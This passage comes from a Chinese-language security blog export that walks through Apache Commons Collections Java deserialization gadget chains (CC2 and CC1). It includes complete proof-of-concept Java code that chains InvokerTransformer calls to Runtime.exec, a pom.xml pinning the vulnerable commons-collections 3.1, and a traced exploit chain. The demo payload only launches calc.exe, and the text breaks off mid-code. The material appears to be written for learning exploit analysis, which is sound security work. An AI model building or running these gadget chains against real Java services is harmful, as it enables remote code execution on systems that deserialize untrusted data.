class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        serialize(priorityQueue);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="问题-没有经过反序列化仍能弹出计算器。"><a href="#问题-没有经过反序列化仍能弹出计算器。" class="headerlink" title="问题 没有经过反序列化仍能弹出计算器。"></a>问题 没有经过反序列化仍能弹出计算器。</h2><p>这里我们可以详细跟一下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235678.png" alt="QQ截图20220303221145"></p><p>在跟如add之后，这里的size&#x3D;2，然后继续跟进<strong>siftUp（）</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032214484.png" alt="QQ截图20220303221246"></p><p>继续跟进。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235283.png" alt="QQ截图20220303221535"></p><p>继续。然后产生了两次<strong>transform</strong>，执行了两次代码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032215085.png"></p><p>可以试试<strong>siftUpComparable</strong></p><h2 id="siftUpComparable"><a href="#siftUpComparable" class="headerlink" title="siftUpComparable"></a>siftUpComparable</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236883.png" alt="QQ截图20220303222405"></p><p>可惜最后跟了一遍，直接没有调用**compare()**。</p><h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><p>反射！<br>直接后面在给 <strong>PriorityQueue</strong>添加<strong>comparator</strong>参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br></code></pre></td></tr></table></figure><p>这里有个小问题。我一直在forname里面纠结。一直填成这个（java.util.function.Consumer.PriorityQueue），后续在（写poc的页面才看到<code>import java.util.PriorityQueue;</code>，emmm感觉自己有点笨。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span> );<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="/2022/03/03/CommonsCollections1/"/>
    <url>/2022/03/03/CommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>jdk8u71之后修复了漏洞</strong></p><p>这是我用的版本。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725224.png" alt="QQ截图20220302152210"></p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p><strong>漏洞版本：Apache-Commons-Collections&lt;&#x3D;3.1</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Apache-Commons-Collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725366.png" alt="QQ截图20220302151835"></p><h3 id="sun-reflect-annotation"><a href="#sun-reflect-annotation" class="headerlink" title="sun.reflect.annotation"></a>sun.reflect.annotation</h3><p>这个包我们要自行导入。（对应找到版本）<br><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p><p>找到jdk版本，解压缩src.zip<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021539384.png" alt="QQ截图20220302153927"></p><p>然后将下载的压缩包，找到sun文件夹，加入至src。即可。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725733.png" alt="QQ截图20220302153927"></p><p>然后就是在idea中导入。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725699.png" alt="QQ截图20220302154312"></p><p>欧克！<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725960.png" alt="QQ截图20220302154736"></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>set<span class="hljs-constructor">Value()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><p>最多的就是这么个东西，进去瞧瞧。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021616758.png" alt="QQ截图20220302161553"></p><p>从上往下看利用链子。（指实现了transform接口的）</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021622247.png" alt="QQ截图20220302162237"></p><p><strong>传入的数组，在transform方法中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</strong></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725974.png" alt="QQ截图20220302162414"></p><p>给了什么就返回什么。</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725553.png" alt="QQ截图20220302162610"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725101.png" alt="QQ截图20220302162616"></p><p>这里就比较有意思了。直接利用反射了。而且传入的参数是可以控制的。</p><h3 id="利用invokerTransformer弹个计算器"><a href="#利用invokerTransformer弹个计算器" class="headerlink" title="利用invokerTransformer弹个计算器"></a>利用invokerTransformer弹个计算器</h3><h4 id="复习反射"><a href="#复习反射" class="headerlink" title="复习反射"></a>复习反射</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>aClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(runtime);<br></code></pre></td></tr></table></figure><p>如果看不懂这个为什么这么构造建议多看，上面<code>invokerTransformer</code>的实现方法。或者回去复习反射。</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725975.png" alt="QQ截图20220302165423"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021648812.png" alt="QQ截图20220302164819"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725010.png" alt="QQ截图20220302164829"></p><p>很有意思，即使是这里用protect保护了此方法，但是还给了另外的实现传入参数方法。这里不就是传入值，然后就会继续调用<code>invokerTransformer</code>。</p><p>相当于传入一个<code>valueTransformer</code>，而这个值我们可以控制，刚好可以传入<strong>invokerTransformer</strong></p><p>构造！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>  <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>  HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>  TransformedMap.decorate(objectObjectHashMap,<span class="hljs-literal">null</span>,exec);<br></code></pre></td></tr></table></figure><p>但是这里却没有触发<code>checkSetValue</code>方法。</p><h3 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue"></a>checkSetValue</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021703497.png" alt="QQ截图20220302170322"></p><p>真的巧，只有一处使用了它。去看看。先去训练了。（主要是憋不住尿了。谈了恋爱也要经常锻炼，水了队里好几次训练了。哈哈哈~~）<br>22.13才赶到实验室。<br>继续写吧。<br>继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725179.png" alt="QQ截图20220302221426"></p><p>很显然这里要找<code>setValue</code>。这里我们可以注意到，这两类都继承了<code>AbstractInputCheckedMapDecorator</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725383.png" alt="QQ截图20220302221854"></p><p>也就是说在使用entry遍历赋值被修饰过的类赋值时，会调用这个方法。而这个父类刚好又是这里的<code>MapEntry</code>的类。真的太巧了。</p><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>      <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>      HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      objectObjectHashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>      Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, exec);<br>      <span class="hljs-keyword">for</span>(Map.Entry entry:decorate.entrySet())&#123;<br>          entry.setValue(runtime);<br>      &#125;<br><br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>记得之前加入的包吗？这里其实就很凑巧。很有意思。刚好<code>AnnotationInvocationHandler</code>里面的<code>readObjetc</code>尽然调用了<code>setValue</code></p><p>而且这个<code>readObject</code>刚好完成了遍历数组的功能。还可以反序列。达到漏洞的效果。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725232.png" alt="QQ截图20220302223706"></p><p>然后看看它的构造函数。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203022239939.png" alt="QQ截图20220302223929"></p><p>这里值得注意<strong>作用域</strong>，之前文章有讲。<br><strong>Annotation</strong>：注解类。<br><strong>memberValues</strong>：可控值。传入<code>decorate</code>。<br>然后我们解决一下<code>AnnotationInvocationHandler</code>中的限制条件。<br><strong>两个<code>if</code>和不可控制的传入<code>setValue</code>的值</strong></p><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031629397.png" alt="QQ截图20220303162858"></p><p><strong>第一个if</strong>：这里就是要找一个注解类，并且有实现方法。</p><p>注解类中两个注解，都实现了<strong>value（）</strong>方法。<br><strong>@Target</strong>和**@Retention**</p><p><strong>第二个if：</strong>判断两个类型是否能够强转</p><h4 id="不可控制的传入setValue的值"><a href="#不可控制的传入setValue的值" class="headerlink" title="不可控制的传入setValue的值"></a>不可控制的传入<code>setValue</code>的值</h4><p>利用<strong>ConstantTransformer</strong>。直接 </p><h3 id="解决Runtime类不可以序列化"><a href="#解决Runtime类不可以序列化" class="headerlink" title="解决Runtime类不可以序列化"></a>解决Runtime类不可以序列化</h3><p>巧的是，Runtime的class是可以序列化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> runtime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(invoke,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>**Object invoke = runtime.invoke(null, null);**</code><br>相当于是获取到了Runtime这个对象。</p><p>然后就去构造到<strong>invokerTransformer</strong>中去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span 